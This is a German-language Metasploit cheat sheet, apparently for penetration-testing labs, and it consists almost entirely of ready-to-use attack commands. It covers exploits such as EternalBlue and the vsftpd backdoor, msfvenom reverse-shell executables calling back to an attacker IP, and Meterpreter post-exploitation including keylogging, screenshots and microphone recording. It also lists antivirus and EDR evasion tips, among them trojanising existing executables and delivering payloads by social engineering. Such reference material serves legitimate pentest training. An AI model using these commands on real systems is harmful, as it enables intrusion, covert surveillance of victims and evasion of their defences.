msfconsole      # Startet Metasploit

msfupdate       # Führt Updates durch

searchsploit    # Lokaler Exploit-Search (nicht Teil von MSF, aber wichtig)


back             # Zurück ins vorherige Menü

info             # Details zum Modul

show exploits    # Liste aller Exploits

jobs             # Hintergrund-Jobs anzeigen

kill <JobID>     # Job beenden

save             # Alle Einstellungen speichern

setg             # Global setzen (z.B. `setg LHOST`)


Exploit: Schwachstelle

Payload: Was ausgeführt wird (z.B. Shell)

Module: Exploits, Scans, Hilfsprogramme

Encoder: Verschlüsselung gegen AV/EDR

Nops: "No-Operation" Padding

Listener: Wartet auf Verbindung (Reverse Shell)


**📌 Port- und Servicerecon via Nmap:** db_nmap -sV -p- 10.10.10.10
→ Ergebnisse werden direkt in die Metasploit-Datenbank importiert.

hosts        # Zeigt erkannte Hosts

services     # Zeigt erkannte Services

vulns        # Zeigt bekannte Schwachstellen


**🔎 Modul finden und auswählen:**:

search vsftpd

search type:exploit name:ftp

use exploit/unix/ftp/vsftpd_234_backdoor


show options

set RHOSTS 10.10.10.10

set RPORT 21

set LHOST <deine IP>

set LPORT 4444


**🧨 Payload auswählen:**

set PAYLOAD linux/x86/meterpreter/reverse_tcp

show payloads        # Liste kompatibler Payloads



exploit         # Führt Exploit aus

run             # Alias für exploit

exploit -j      # Hintergrund (Job)

exploit -z      # Kein automatischer Sessionwechsel


**🐚 Post-Exploitation (Meterpreter):**

sessions                 # Liste aller aktiven Sessions

sessions -i <ID>         # Wechsel in Session

pwd, ls, cd              # Navigation

download file.txt        # Vom Ziel holen

upload script.sh         # Hochladen

sysinfo                  # OS-Infos

getuid                   # Benutzer anzeigen

ps                       # Prozesse anzeigen

shell                    # Interaktive Shell starten

migrate <PID>            # Zu anderem Prozess wechseln

keyscan_start            # Keylogger starten

screenshot               # Bildschirmfoto

record_mic               # Mikrofon aufnehmen

**💀 Privilege Escalation:**

use post/multi/recon/local_exploit_suggester

set SESSION 1

run
→ Zeigt passende lokale Escalations.


**🎯 Reverse Shell Payloads:**

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST <dein VPN>

set LPORT 4444


*Staged: kleiner Loader, lädt weiteren Code nach (z. B. reverse_tcp)*
*Stageless: ganze Payload auf einmal (z. B. reverse_tcp_rc4)*



use auxiliary/scanner/ftp/ftp_version

use auxiliary/scanner/http/dir_scanner

use auxiliary/scanner/rdp/rdp_scanner

use auxiliary/scanner/smb/smb_enumshares

use auxiliary/scanner/ssh/ssh_login


set RHOSTS 10.10.10.10

set THREADS 10

run


**📁 Payloads generieren (msfvenom):**

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.1 LPORT=4444 -f exe -o shell.exe

Beliebte Formate: exe, elf, asp, aspx, war, ps1, php, bash, js



use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.9.0.1

set LPORT 4444

exploit




| Zielsystem  | Beispiel-Modul                             |
| ----------- | ------------------------------------------ |
| Samba       | `exploit/multi/samba/usermap_script`       |
| Windows SMB | `exploit/windows/smb/ms08_067_netapi`      |
| MS17-010    | `exploit/windows/smb/ms17_010_eternalblue` |
| Web (PHP)   | `exploit/unix/webapp/phpmyadmin_lfi_rce`   |
| Tomcat      | `exploit/multi/http/tomcat_mgr_upload`     |


**AV/EDR umgehen:**
| Technik        | Hinweis                                     |
| -------------- | ------------------------------------------- |
| Encoder        | z. B. `-e x86/shikata_ga_nai`               |
| Custom Binary  | z. B. `.ps1`, `.hta`, `.doc`                |
| Obfuscation    | Manuelles Packing, Macro Delivery           |
| Payload Split  | Staged Payload nutzen                       |
| Trojanisierung | z. B. `msfvenom` in bestehende EXE injecten |


**Datenbank:**

msfdb init         # Startet Postgres-DB für Metasploit

db_status          # Zeigt Status an

workspace -a hack  # Erstellt neuen Arbeitsbereich

hosts, services    # Ausgabe je nach Workspace


**🗂️ Strukturierte Pentest-Nutzung:**
# Setup

workspace -a targetXYZ

db_nmap -sV -T4 -A 10.10.10.10

services

search <version>

use exploit/...


- Kombiniere Nmap und Metasploit: Ports aus Nmap mit search port:PORT matchen
- Nutze exploit suggester Module nach erfolgreicher Shell
- Verwende post/multi/recon/local_exploit_suggester
- Verwende msfvenom mit Social Engineering (PDF, HTA, VBA etc.)
- AV-Bypass: Payloads mit encoders (-e x86/shikata_ga_nai) & packern
